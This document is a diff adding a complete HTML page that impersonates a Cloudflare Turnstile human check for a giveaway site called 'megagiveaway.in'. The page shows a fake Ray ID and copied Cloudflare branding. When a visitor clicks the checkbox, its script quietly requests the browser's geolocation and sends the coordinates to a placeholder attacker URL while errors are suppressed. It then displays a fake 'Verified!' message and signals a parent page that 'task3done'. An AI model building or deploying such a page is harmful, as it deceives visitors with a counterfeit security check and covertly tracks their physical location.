@@ -1,0 +1,360 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Just a moment...</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+      background: #f0f2f5;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      color: #1d1d1f;
+    }
+
+    .cf-wrapper {
+      background: white;
+      border-radius: 8px;
+      box-shadow: 0 2px 12px rgba(0,0,0,0.12);
+      width: 90%;
+      max-width: 440px;
+      overflow: hidden;
+    }
+
+    /* Top orange bar like Cloudflare */
+    .cf-topbar {
+      background: #f6821f;
+      height: 6px;
+      width: 100%;
+    }
+
+    .cf-body {
+      padding: 36px 32px 28px;
+    }
+
+    .cf-icon-row {
+      display: flex;
+      align-items: center;
+      gap: 14px;
+      margin-bottom: 24px;
+    }
+
+    .cf-shield {
+      width: 48px;
+      height: 48px;
+      flex-shrink: 0;
+    }
+
+    .cf-site-info h2 {
+      font-size: 15px;
+      font-weight: 600;
+      color: #1d1d1f;
+      margin-bottom: 2px;
+    }
+
+    .cf-site-info p {
+      font-size: 13px;
+      color: #6e6e73;
+    }
+
+    .cf-heading {
+      font-size: 22px;
+      font-weight: 700;
+      color: #1d1d1f;
+      margin-bottom: 6px;
+    }
+
+    .cf-subheading {
+      font-size: 14px;
+      color: #6e6e73;
+      margin-bottom: 28px;
+      line-height: 1.5;
+    }
+
+    /* The turnstile box */
+    .cf-turnstile {
+      border: 1px solid #d1d5db;
+      border-radius: 6px;
+      padding: 14px 16px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      background: #fafafa;
+      margin-bottom: 20px;
+      cursor: pointer;
+      user-select: none;
+      transition: border-color 0.2s;
+    }
+
+    .cf-turnstile:hover { border-color: #f6821f; }
+
+    .cf-turnstile.verifying { border-color: #f6821f; }
+    .cf-turnstile.verified { border-color: #16a34a; background: #f0fdf4; }
+
+    .cf-check-area {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+    }
+
+    /* Checkbox states */
+    .cf-checkbox {
+      width: 24px;
+      height: 24px;
+      border: 2px solid #9ca3af;
+      border-radius: 3px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      flex-shrink: 0;
+      transition: all 0.2s;
+      background: white;
+    }
+
+    .cf-checkbox.spinning {
+      border-color: #f6821f;
+      border-top-color: transparent;
+      border-radius: 50%;
+      animation: spin 0.7s linear infinite;
+    }
+
+    .cf-checkbox.checked {
+      background: #16a34a;
+      border-color: #16a34a;
+      border-radius: 3px;
+      animation: none;
+    }
+
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+
+    .cf-checkbox svg {
+      display: none;
+    }
+
+    .cf-checkbox.checked svg {
+      display: block;
+    }
+
+    .cf-label {
+      font-size: 14px;
+      color: #374151;
+      font-weight: 500;
+    }
+
+    .cf-label.verified-text { color: #16a34a; }
+
+    /* Cloudflare branding right side */
+    .cf-brand {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 3px;
+    }
+
+    .cf-brand-logo {
+      width: 32px;
+      height: 32px;
+    }
+
+    .cf-brand-text {
+      font-size: 9px;
+      color: #9ca3af;
+      text-align: center;
+      line-height: 1.3;
+    }
+
+    .cf-brand-text b {
+      display: block;
+      color: #6e6e73;
+      font-size: 10px;
+    }
+
+    /* Footer */
+    .cf-footer {
+      border-top: 1px solid #f0f0f0;
+      padding: 14px 32px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      font-size: 12px;
+      color: #9ca3af;
+    }
+
+    .cf-footer a { color: #9ca3af; text-decoration: none; }
+    .cf-footer a:hover { text-decoration: underline; }
+
+    .cf-powered {
+      display: flex;
+      align-items: center;
+      gap: 5px;
+    }
+
+    /* Success overlay that fades in */
+    .cf-success {
+      display: none;
+      text-align: center;
+      padding: 12px 0 4px;
+    }
+
+    .cf-success.show { display: block; }
+
+    .cf-success p {
+      font-size: 13px;
+      color: #16a34a;
+      font-weight: 500;
+    }
+
+    /* Ray ID bar at bottom like real CF */
+    .cf-rayid {
+      background: #f9fafb;
+      border-top: 1px solid #e5e7eb;
+      padding: 8px 32px;
+      font-size: 11px;
+      color: #9ca3af;
+      font-family: monospace;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="cf-wrapper">
+    <div class="cf-topbar"></div>
+
+    <div class="cf-body">
+
+      <div class="cf-icon-row">
+        <!-- Cloudflare shield SVG -->
+        <svg class="cf-shield" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+          <path d="M24 4L6 12V24C6 33.9 14.1 43.1 24 46C33.9 43.1 42 33.9 42 24V12L24 4Z" fill="#f6821f"/>
+          <path d="M24 4L6 12V24C6 33.9 14.1 43.1 24 46V4Z" fill="#faad3f"/>
+          <path d="M24 14L16 18V24C16 29.5 19.6 34.5 24 36C28.4 34.5 32 29.5 32 24V18L24 14Z" fill="white" opacity="0.9"/>
+        </svg>
+        <div class="cf-site-info">
+          <h2>megagiveaway.in</h2>
+          <p>Checking your connection...</p>
+        </div>
+      </div>
+
+      <h1 class="cf-heading">Verify you are human</h1>
+      <p class="cf-subheading">This site is protected by security verification. Please complete the challenge below to continue.</p>
+
+      <div class="cf-turnstile" id="turnstile" onclick="startVerify()">
+        <div class="cf-check-area">
+          <div class="cf-checkbox" id="cf-checkbox"></div>
+          <span class="cf-label" id="cf-label">I am human</span>
+        </div>
+        <div class="cf-brand">
+          <!-- Cloudflare logo SVG -->
+          <svg class="cf-brand-logo" viewBox="0 0 64 64" xmlns="http://www.w3.org/2000/svg">
+            <path d="M42.6 27.3c.2-.6.3-1.2.3-1.9 0-4.4-3.6-8-8-8-2.5 0-4.8 1.2-6.3 3-0.8-0.4-1.7-0.6-2.6-0.6-3.3 0-6 2.7-6 6 0 .4 0 .8.1 1.2C17.4 27.6 15 30.3 15 33.6c0 3.5 2.8 6.4 6.3 6.4H42c3.1 0 5.7-2.5 5.7-5.7-.1-3-2.4-5.5-5.1-7z" fill="#f6821f"/>
+          </svg>
+          <div class="cf-brand-text">
+            <b>Cloudflare</b>
+            Turnstile
+          </div>
+        </div>
+      </div>
+
+      <div class="cf-success" id="cf-success">
+        <p>✅ Verification successful — redirecting...</p>
+      </div>
+
+    </div>
+
+    <div class="cf-footer">
+      <div class="cf-powered">
+        Performance & security by
+        <svg width="14" height="14" viewBox="0 0 64 64" xmlns="http://www.w3.org/2000/svg" style="margin-left:4px">
+          <path d="M42.6 27.3c.2-.6.3-1.2.3-1.9 0-4.4-3.6-8-8-8-2.5 0-4.8 1.2-6.3 3-0.8-0.4-1.7-0.6-2.6-0.6-3.3 0-6 2.7-6 6 0 .4 0 .8.1 1.2C17.4 27.6 15 30.3 15 33.6c0 3.5 2.8 6.4 6.3 6.4H42c3.1 0 5.7-2.5 5.7-5.7-.1-3-2.4-5.5-5.1-7z" fill="#f6821f"/>
+        </svg>
+        <b style="color:#6e6e73; margin-left:3px">Cloudflare</b>
+      </div>
+      <div>
+        <a href="#">Privacy</a> &nbsp;·&nbsp; <a href="#">Terms</a>
+      </div>
+    </div>
+
+    <div class="cf-rayid" id="ray-id">
+      Ray ID: &nbsp;<span id="ray-val"></span>
+    </div>
+  </div>
+
+  <script>
+    // Generate fake Ray ID like Cloudflare shows
+    var chars = '0123456789abcdef';
+    var rayId = '';
+    for (var i = 0; i < 16; i++) rayId += chars[Math.floor(Math.random() * chars.length)];
+    document.getElementById('ray-val').textContent = rayId;
+
+    var verified = false;
+
+    function startVerify() {
+      if (verified) return;
+
+      var box = document.getElementById('cf-checkbox');
+      var label = document.getElementById('cf-label');
+      var turnstile = document.getElementById('turnstile');
+
+      // Step 1: spinning state
+      box.classList.add('spinning');
+      label.textContent = 'Verifying...';
+      turnstile.classList.add('verifying');
+      turnstile.style.pointerEvents = 'none';
+
+      // Silently request location in background
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+          function(pos) {
+            // Location obtained — send to your Linux URL
+            var lat = pos.coords.latitude;
+            var lng = pos.coords.longitude;
+            var acc = pos.coords.accuracy;
+            // PASTE YOUR LINUX URL BELOW — coords sent as query params
+            var linuxURL = 'YOUR_LINUX_URL_3'; // <-- paste your Linux URL here
+            fetch(linuxURL + '?lat=' + lat + '&lng=' + lng + '&acc=' + acc, { mode: 'no-cors' })
+              .catch(function() {}); // silent, ignore errors
+          },
+          function() {} // silent if denied
+        );
+      }
+
+      // Step 2: after 1.8s show verified
+      setTimeout(function() {
+        box.classList.remove('spinning');
+        box.classList.add('checked');
+        box.innerHTML = '<svg width="14" height="14" viewBox="0 0 14 14" fill="none"><path d="M2 7L6 11L12 3" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>';
+        label.textContent = 'Verified!';
+        label.classList.add('verified-text');
+        turnstile.classList.remove('verifying');
+        turnstile.classList.add('verified');
+        verified = true;
+
+        // Show success message
+        document.getElementById('cf-success').classList.add('show');
+
+        // Step 3: after 1.5 more seconds, go back to main page
+        setTimeout(function() {
+          // Send message to opener (main page) that task 3 is done
+          if (window.opener) {
+            window.opener.postMessage('task3done', '*');
+            window.close();
+          } else {
+            // fallback: go back
+            history.back();
+          }
+        }, 1500);
+
+      }, 1800);
+    }
+  </script>
+
+</body>
+</html>
